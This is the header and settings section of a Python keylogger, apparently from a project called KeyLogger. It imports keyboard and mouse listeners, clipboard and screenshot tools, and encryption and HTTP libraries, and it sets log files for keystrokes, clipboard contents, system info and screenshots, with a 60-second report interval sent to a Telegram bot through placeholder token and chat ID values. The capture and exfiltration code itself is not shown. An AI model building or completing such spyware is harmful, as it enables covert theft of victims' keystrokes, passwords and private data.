# Standard library imports for network communication and system-level operations.
import socket  # Provides access to the BSD socket interface for networking.
import platform  # Access to underlying platform’s identifying data.

# Third-party import for interacting with the Windows clipboard.
import win32clipboard  # Allows Python code to access the Windows clipboard.

# Imports from the pynput library to capture keyboard and mouse events.
from pynput.keyboard import Listener as KeyListener  # Listener for keyboard events.
from pynput.mouse import Listener as MouseListener  # Listener for mouse events.

# Import threading for running different parts of the application concurrently.
import threading  # Enables the creation of threads for parallel execution.

# Import time for time-related functions.
import time  # Provides various time-related functions.

# Import from cryptography for encryption and decryption of logs.
from cryptography.fernet import Fernet  # Cryptographic recipes and primitives.

# Import get from requests for making HTTP requests (unused in this snippet).
from requests import get  # Simplifies making HTTP GET requests.

# Import pyautogui for programmatically controlling the mouse and keyboard.
import pyautogui  # GUI automation to simulate user interaction.

# Import psutil for retrieving system information and process management.
import psutil  # Provides an interface for retrieving information on system utilization.

# Import requests for making HTTP requests.
import requests  # Elegant and simple HTTP library for Python, built for human beings.


# File paths and settings
keys_information = "key_log.txt"
mouse_information = "mouse_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
file_path = "C:\\Users\\User\\PycharmProjects\\KeyLogger\\venv"
extend = "\\"
SEND_REPORT_EVERY = 60

# Telegram settings
telegram_token = 'your_telegram_bot_token'  # Replace with your token
telegram_chat_id = 'your_chat_id'  # Replace with your chat ID